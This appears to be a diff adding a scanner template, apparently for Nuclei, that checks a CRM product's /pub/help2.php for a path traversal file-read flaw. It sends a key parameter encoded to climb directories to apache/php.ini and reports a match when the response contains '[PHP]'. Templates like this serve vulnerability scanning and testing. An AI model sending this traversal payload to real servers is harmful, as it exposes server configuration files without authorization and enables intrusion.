@@ -1,0 +1,18 @@
+id: yyu8crm-help2key-fileread
+
+info:
+  name: yyu8crm-help2key-fileread
+  author: yyu8crm-help2key-fileread
+  severity: medium
+
+http:
+  - raw:
+      - |
+        GET /pub/help2.php?key=%2F..%2F..%2Fapache%2Fphp.ini HTTP/1.1
+        Content-Type: text/html; charset=utf-8
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"php.ini","[PHP]")
